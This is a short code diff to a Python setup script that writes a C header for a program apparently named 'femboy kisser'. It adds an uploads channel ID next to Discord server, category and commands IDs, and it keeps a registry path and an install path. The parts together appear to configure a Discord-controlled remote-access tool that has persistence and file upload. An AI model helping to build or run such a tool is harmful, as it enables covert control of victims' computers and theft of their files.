@@ -14,6 +14,7 @@ ENVH_TEMPLATE = """
 #define SERVER_ID "{SERVER_ID}"
 #define CATEGORY_ID "{CATEGORY_ID}"
 #define COMMANDS_ID "{COMMANDS_ID}"
+#define UPLOADS_ID "{UPLOADS_ID}"
 
 #define FEMBOY_KISSER_REG_PATH "Software\\\\{NAME}"
 #define INSTALL_PATH "{INSTALL_PATH}"
@@ -40,8 +41,9 @@ print("Go to your Discord server, right-click the channel you want to use for co
 server_id = input("Enter the server ID: ").strip()
 category_id = input("Enter the category ID: ").strip()
 commands_id = input("Enter the commands ID: ").strip()
+uploads_id = input("Enter the uploads ID: ").strip()
 
-if not (server_id.isdigit() and category_id.isdigit() and commands_id.isdigit()):
+if not (server_id.isdigit() and category_id.isdigit() and commands_id.isdigit() and uploads_id.isdigit()):
     print("IDs must be numeric. Please enter valid IDs.")
     exit(1)
 
@@ -80,6 +82,7 @@ with open("source/env.h", "w") as f:
         SERVER_ID=server_id,
         CATEGORY_ID=category_id,
         COMMANDS_ID=commands_id,
+        UPLOADS_ID=uploads_id,
         NAME=name,
         INSTALL_PATH=install_path,
         CONFIRM_CODE=confirm_code
